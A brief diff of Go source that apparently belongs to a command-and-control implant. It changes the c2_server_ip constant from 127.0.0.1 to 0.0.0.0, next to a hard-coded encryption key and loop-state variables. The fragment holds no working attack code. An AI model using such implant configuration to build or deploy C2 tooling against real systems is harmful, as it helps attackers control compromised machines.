@@ -26,7 +26,7 @@ var key []byte = []byte{
     0xab, 0xf7, 0x15, 0x88,
     0x09, 0xcf, 0x4f, 0x3c,
 }
-const c2_server_ip = "127.0.0.1"
+const c2_server_ip = "0.0.0.0"
 var firstLoopDone string = "false"
 var (
 	echo_to_stdout string
